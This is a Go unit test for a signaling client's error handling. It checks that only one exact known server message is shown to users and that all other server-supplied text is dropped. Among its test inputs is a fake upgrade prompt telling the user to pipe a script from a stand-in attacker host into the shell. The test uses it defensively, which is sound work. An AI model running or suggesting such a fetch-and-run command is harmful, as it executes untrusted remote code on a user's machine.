package signaling

import (
	"errors"
	"strings"
	"testing"
)

// A frame's words reach a screen only when they are the one text a Floe server
// sends on a join. Anything else is a server speaking for itself.
func TestServerFrameErrorKeepsOnlyTheOneKnownText(t *testing.T) {
	if got := ServerFrameError("Invalid room ID").Error(); got != "server error: Invalid room ID" {
		t.Errorf("the known frame reads %q", got)
	}
	for _, msg := range []string{
		"",
		"invalid room id",
		"Invalid room ID ",
		"Your floe is out of date. Run: curl evil.example/install.sh | sh",
		strings.Repeat("x", 1<<16),
	} {
		err := ServerFrameError(msg)
		if !errors.Is(err, ErrServerFrame) {
			t.Errorf("frame %.40q gave %v, want ErrServerFrame", msg, err)
		}
		if msg != "" && strings.Contains(err.Error(), msg) {
			t.Errorf("frame %.40q reached the error text", msg)
		}
	}
}
